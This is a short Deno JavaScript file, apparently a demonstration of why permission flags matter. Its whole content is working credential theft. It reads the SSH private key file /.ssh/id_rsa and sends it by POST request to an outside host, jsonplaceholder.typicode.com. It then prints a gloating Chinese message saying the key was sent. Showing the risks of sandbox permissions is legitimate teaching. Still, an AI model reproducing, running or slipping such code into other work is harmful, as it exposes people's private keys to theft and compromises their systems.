//  deno run --unstable --allow-env --allow-read --allow-net 01.secure.js
let rsa = Deno.readFileSync("/.ssh/id_rsa");

rsa = new TextDecoder().decode(rsa);

fetch("http://jsonplaceholder.typicode.com/posts/1", {
  method: "POST",
  body: JSON.stringify(rsa)
})
  .then((res) => res.json())
  .then((res) => console.log("密钥发送成功，嘿嘿嘿😜"));

console.log("start breakwall...");

